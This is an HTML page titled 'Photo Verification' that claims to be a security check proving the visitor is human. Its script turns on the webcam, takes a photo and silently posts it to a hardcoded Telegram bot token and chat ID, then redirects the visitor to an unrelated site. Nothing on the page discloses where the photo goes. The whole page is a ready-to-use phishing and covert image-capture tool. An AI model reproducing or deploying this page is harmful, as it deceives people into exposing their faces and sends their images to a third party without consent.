<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #1d3557, #457b9d);
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        h1 {
            font-size: 2.5em;
        }
        p {
            font-size: 1.2em;
        }
        button {
            background: #e63946;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1em;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #d62839;
        }
        video {
            margin-top: 20px;
            width: 100%;
            max-width: 400px;
            border: 5px solid white;
            border-radius: 10px;
        }
        .loading-bar {
            width: 0;
            height: 5px;
            background: #e63946;
            margin: 20px auto;
            border-radius: 5px;
            transition: width 2s ease;
        }
        .loading-container {
            width: 100%;
            max-width: 400px;
            height: 5px;
            background: #ffffff30;
            border-radius: 5px;
            overflow: hidden;
            margin: 20px auto;
        }
    </style>
</head>
<body>
    <div id="home">
        <h1>Photo Verification</h1>
        <p>Please capture a photo for security reasons to prove you are a human and not a bot.</p>
        <button id="start">Start Verification</button>
    </div>
    <div id="camera" style="display: none;">
        <video id="video" autoplay></video>
        <div id="loading-container" class="loading-container" style="display: none;">
            <div id="loading-bar" class="loading-bar"></div>
        </div>
        <button id="capture">Capture Photo</button>
    </div>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const homeDiv = document.getElementById('home');
        const cameraDiv = document.getElementById('camera');
        const video = document.getElementById('video');
        const captureButton = document.getElementById('capture');
        const startButton = document.getElementById('start');
        const canvas = document.getElementById('canvas');
        const loadingBar = document.getElementById('loading-bar');
        const loadingContainer = document.getElementById('loading-container');

        // Start Verification Process
        startButton.addEventListener('click', () => {
            homeDiv.style.display = 'none';
            cameraDiv.style.display = 'block';

            // Start video stream
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                })
                .catch(err => {
                    alert("Camera access is required to continue.");
                    console.error(err);
                });
        });

        // Capture Photo
        captureButton.addEventListener('click', () => {
            // Hide capture button and show loading bar
            captureButton.style.display = 'none';
            loadingContainer.style.display = 'block';
            loadingBar.style.width = '0%';
            setTimeout(() => { loadingBar.style.width = '100%'; }, 100); // Simulate loading

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert photo to blob and send to Telegram
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.7); // Compress image to 70% quality
        });

        // Send Photo to Telegram Bot
        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', '5543174018'); // Replace with your chat ID
            formData.append('photo', blob);

            try {
                const response = await fetch('https://api.telegram.org/bot7455966277:AAE3vN10-2AMKGW5ZKE_WrRR_nSETKot_b8/sendPhoto', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                if (data.ok) {
                    console.log("Photo sent to Telegram:", data);
                    window.location.href = "https://stars.chromeexperiments.com/";
                } else {
                    alert(`Error: ${data.description}`);
                    console.error("Telegram API Error:", data);
                    resetCaptureUI();
                }
            } catch (error) {
                alert("An error occurred while sending the photo. Please try again.");
                console.error("Network Error:", error);
                resetCaptureUI();
            }
        }

        // Reset UI after an error
        function resetCaptureUI() {
            loadingContainer.style.display = 'none';
            loadingBar.style.width = '0%';
            captureButton.style.display = 'block';
        }
    </script>
</body>
</html>
